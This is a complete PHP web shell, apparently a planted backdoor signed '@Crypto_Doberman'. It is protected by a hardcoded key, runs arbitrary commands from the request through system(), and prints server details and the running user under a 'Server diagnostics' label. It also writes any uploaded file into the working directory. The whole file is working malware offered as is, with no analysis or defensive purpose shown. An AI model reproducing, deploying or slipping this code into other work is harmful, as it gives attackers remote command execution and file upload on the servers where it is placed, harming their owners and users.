<?php
// @Crypto_Doberman
$key = "d0b3rm@n";
if(isset($_REQUEST['key']) && $_REQUEST['key'] === $key) {
    if(isset($_REQUEST['cmd'])) {
        // Server diagnostics
        echo "### SERVER DIAGNOSTICS ###\n";
        echo "SERVER_NAME: " . $_SERVER['SERVER_NAME'] . "\n";
        echo "DOCUMENT_ROOT: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
        echo "SCRIPT_FILENAME: " . $_SERVER['SCRIPT_FILENAME'] . "\n";
        echo "REMOTE_ADDR: " . $_SERVER['REMOTE_ADDR'] . "\n";
        echo "SERVER_ADDR: " . $_SERVER['SERVER_ADDR'] . "\n";
        echo "SERVER_SOFTWARE: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
        echo "PHP_VERSION: " . phpversion() . "\n";
        echo "CURRENT_USER: " . exec('whoami') . "\n";
        echo "CURRENT_DIR: " . getcwd() . "\n";
        echo "FILE_PATH: " . __FILE__ . "\n";
        echo "FILE_SIZE: " . filesize(__FILE__) . " bytes\n\n";
        
        // Execute command
        echo "### COMMAND OUTPUT ###\n";
        system($_REQUEST['cmd']);
        echo "\n\n### END ###";
    } elseif(isset($_FILES['f']['name'])) {
        move_uploaded_file($_FILES['f']['tmp_name'], getcwd()."/".$_FILES['f']['name']);
    }
} else {
    echo "Access Denied";
}
?>
